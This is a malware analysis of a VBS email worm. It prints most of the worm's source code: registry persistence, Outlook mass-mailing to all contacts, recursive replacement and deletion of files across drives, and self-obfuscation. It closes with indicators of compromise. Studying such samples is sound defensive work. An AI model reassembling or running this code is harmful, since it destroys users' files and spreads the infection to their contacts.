
# Analysis of a VBS Worm: "special goat, do not spread! m.s."

## Introduction

This script is a **Visual Basic Script (VBS) worm**, likely written in the early 2000s, that spreads via **Microsoft Outlook and local drives**. It copies itself to key system directories, sets **registry keys for persistence**, and uses **file infection** to replace user files with infected `.Vbs` clones.

It also includes basic **obfuscation techniques** when replicating itself. The code shows signs of being a **proof-of-concept or intentionally non-aggressive variant**, as suggested by the initial comment line:
```
rem special goat, do not spread! m.s.
```

## General Behavior

At a high level, the worm performs the following actions:

1. **Initializes its environment** by setting up file paths and naming.
2. **Infects the host machine** by copying itself and modifying the Windows registry.
3. **Spreads through Outlook** by mass-mailing itself to all contacts.
4. **Propagates to local and removable drives** by replacing existing files.
5. **Uses obfuscation** to make static analysis more difficult.

## Technical Analysis

### Function: `Main`

This is the entry point of the worm. It simply calls the main functional blocks in sequence, while ignoring all errors.

```vb
sub Main()
    On Error Resume Next
    Initialize
    InfectComputer
    SpreadToEmails
    SpreadToLocal
end sub
```

### Function: `Initialize`

This function sets up the initial environment, collects Windows system paths, selects a file name (from the Recent folder if possible), and creates the name of the malicious file that will be sent or dropped.

```vb
Set MySelf = fso.GetFile(WScript.ScriptFullName)
Set MyFile = fso.OpenTextFile(WScript.ScriptFullName,1)
WindowsDir = fso.GetSpecialFolder(0)
WindowsSystemDir = fso.GetSpecialFolder(1)
WindowsRecentDir = WindowsDir & "\Recent"

MyNewName = CreateName

Set folder = fso.GetFolder(WindowsRecentDir)
Set files = folder.files
If cint(files.count) > 0 Then
    tmpFileNmber = int(rnd(1)* files.count)
    Indx = 0
    For Each file In files
        Indx = Indx + 1
        If tmpFileNmber = Indx Then
            CopyToSend = fso.GetBaseName(file.path)
        End If
    Next
Else
    CopyToSend = MyNewName
End If

CopyToSend = CopyToSend & CreateExtension
```

### Function: `InfectComputer`

This function handles **infection of the host system**. It copies the script into system directories and sets registry keys for persistence.

```vb
MySelf.Copy(WindowsSystemDir & "\" & MyNewName & Extension)
MySelf.Copy(WindowsDir & "\" & MyNewName & Extension)

Set NewCopy = fso.OpenTextFile(WindowsSystemDir & "\" & CopyToSend, 2, True)
NewCopy.Write Transform
NewCopy.Close

CreateReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & MyNewName, _
          WindowsSystemDir & "\" & MyNewName & Extension

CreateReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & MyNewName, _
          WindowsDir & "\" & MyNewName & Extension
```

### Function: `SpreadToEmails`

This function connects to Microsoft Outlook, accesses all address books, and sends an email with the worm as an attachment to every contact.

```vb
Set Outlook = WScript.CreateObject("Outlook.Application")
Set MAPI = Outlook.GetNameSpace("MAPI")

For ListIndex = 1 To MAPI.AddressLists.Count
    Set AddressBook = MAPI.AddressLists(ListIndex)
    For AddressIndex = 1 To AddressBook.AddressEntries.Count
        MailAddress = AddressBook.AddressEntries(AddressIndex)
        Set mail = Outlook.CreateItem(0)
        mail.Recipients.Add(MailAddress)
        mail.Subject = "FW: " & Left(CopyToSend, Len(CopyToSend)-4)
        mail.Body = ""
        mail.Attachments.Add(WindowsSystemDir & "\" & CopyToSend)
        mail.Send
    Next
Next
```

### Function: `SpreadToLocal`

This function initiates a recursive search through all local and removable drives to propagate the worm.

```vb
SearchDrives
```

### Function: `SearchDrives`

This function iterates through all available drives and targets fixed and removable ones for infection.

```vb
Set LstDrives = fso.Drives
For Each Drive In LstDrives
    If Drive.DriveType = 2 Or Drive.DriveType = 3 Then
        SearchFolders(Drive.path & "\")
    End If
Next
```

### Function: `SearchFolders`

A recursive function that browses through folders and subfolders to locate and infect files.

```vb
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders

For Each f1 In sf
    infectfiles(f1.path)
    SearchFolders(f1.path)
Next
```

### Function: `Infectfiles`

This function replaces all files in the given directory with infected `.vbs` versions, and deletes the originals.

```vb
Set folder = fso.GetFolder(folderspec)
Set files = folder.Files

For Each file In files
    FileName = file.name
    Set NewCopy = fso.OpenTextFile(file.path & ".Vbs", 2, True)
    NewCopy.Write NewCode
    NewCopy.Close
    fso.DeleteFile(file.path)
Next
```

### Function: `Transform`

This function generates an **obfuscated version** of the script by injecting random characters, names, and comments.

```vb
Do While (MyFile.AtEndOfStream <> TRUE)
    LineText = CStr(MyFile.ReadLine)
    If UCase(Left(Trim(LineText), 1)) <> "'" Then
        For Indx2 = 1 To tmpIndx
            NewCode = NewCode & String(tmpIndx, " ") & "'"
            For Indx = 1 To tmpIndx
                NewCode = NewCode & CreateName
            Next
            NewCode = NewCode & vbCrLf
        Next
    End If
    NewCode = NewCode & Space(tmpIndx*5) & LineText & vbCrLf
Loop
Transform = NewCode
```

### Function: `CreateName`

Generates a pseudo-random string of capital letters, used for variable and file names.

```vb
NameLen = Int(Rnd(1)*30) + 1
For Indx = 1 To NameLen
    tmpName = tmpName & Chr(Int(Rnd(1)*26)+65)
Next
CreateName = tmpName
```

### Function: `CreateExtension`

Generates a random file extension from a list, mimicking legitimate file types.

```vb
TypeExtension = "DocXlsMdbBmpMp3TxtJpgGifMovUrlHtmTxt"
tmpFileType = Int(Rnd(1) * 11) + 1
CreateExtension = "." & Mid(TypeExtension, ((tmpFileType-1)*3)+1, 3) & ".Vbs"
```

### Function: `CreateReg`

Creates or modifies registry keys to add persistence.

```vb
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey, regvalue
```

## Techniques Used

### ✅ Persistence

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\[RandomName]`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\[RandomName]`

### ✅ Obfuscation

- Junk variables and random strings added via `Transform` function.

### ✅ Propagation

- Uses Outlook to mass-mail itself.
- Infects local and removable drives.

## Conclusion

This VBS worm shows classical self-replication and spreading techniques, registry-based persistence, and basic obfuscation. While technically outdated, it remains a relevant specimen in the history of malware.

## Indicators of Compromise (IOCs)

- Registry Keys:
  - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\[RandomName]`
  - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\[RandomName]`

- Files:
  - `.Doc.Vbs`, `.Mp3.Vbs`, `.Gif.Vbs`, etc.

- Behavior:
  - Mass emails from Outlook
  - File replacement across drives
